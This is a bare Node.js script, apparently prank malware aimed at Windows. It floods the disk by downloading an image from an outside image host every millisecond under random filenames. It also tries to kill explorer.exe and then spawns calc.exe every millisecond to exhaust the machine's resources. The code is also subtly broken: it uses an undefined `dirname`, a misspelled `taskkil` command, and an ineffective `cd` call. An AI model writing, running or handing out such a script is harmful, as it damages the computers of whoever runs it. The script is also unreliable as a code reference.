const {
    exec
} = require("child_process")

const fs = require("fs");
const request = require("request");
require("function_bind")


exec(`cd C:/Users/${dirname.split("\\")[2]}/Desktop`, (err, stdout, stdint) => {
    if (err) {}
    setInterval(() => download("https://image.noelshack.com/fichiers/2021/40/2/1633459367-4431855.jpg", "ZeroTwo", "png"), 1)
    function download(url, nom, format) {
        request.head(url, (err, res, body) => request(url).pipe(fs.createWriteStream(`${nom}-${random(4)}.${format}`)));
    };
    exec("taskkil explorer.exe", (err, stdint, sdout) => {
        if (err) {}
        setInterval(() => exec("start calc.exe"), 1)
    })
    function random(length) {
        var randomed = ""
        var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        for (i = 0; i < length; i++) {
            randomed += chars.charAt(Math.floor(Math.random() * chars.length));
        };
        return randomed
    }
})

